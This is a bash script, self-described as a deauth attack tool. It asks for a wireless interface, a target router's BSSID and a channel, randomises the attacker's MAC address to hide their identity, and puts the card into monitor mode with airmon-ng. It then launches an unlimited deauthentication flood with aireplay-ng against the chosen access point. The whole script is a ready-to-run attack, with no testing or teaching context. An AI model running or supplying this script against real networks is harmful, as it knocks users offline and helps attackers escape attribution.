#!/bin/bash

echo "=== Deauth Attack Script with MAC Spoofing ==="

read -p "Enter your wireless interface (e.g., wlan0): " INTERFACE
read -p "Enter the BSSID of the target router: " TARGET_BSSID
read -p "Enter the channel number of the target router: " CHANNEL

MONITOR_IFACE="${INTERFACE}mon"

echo "[*] Stopping monitor mode if already enabled..."
sudo airmon-ng stop $MONITOR_IFACE

echo "[*] Bringing down $INTERFACE..."
sudo ip link set $INTERFACE down

echo "[*] Spoofing MAC address..."
sudo macchanger -r $INTERFACE

echo "[*] Bringing $INTERFACE back up..."
sudo ip link set $INTERFACE up

echo "[*] Killing conflicting processes..."
sudo airmon-ng check kill

echo "[*] Enabling monitor mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE

echo "[*] Setting $MONITOR_IFACE to channel $CHANNEL..."
sudo iwconfig $MONITOR_IFACE channel $CHANNEL

echo "[*] Launching deauth attack on $TARGET_BSSID..."
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $MONITOR_IFACE

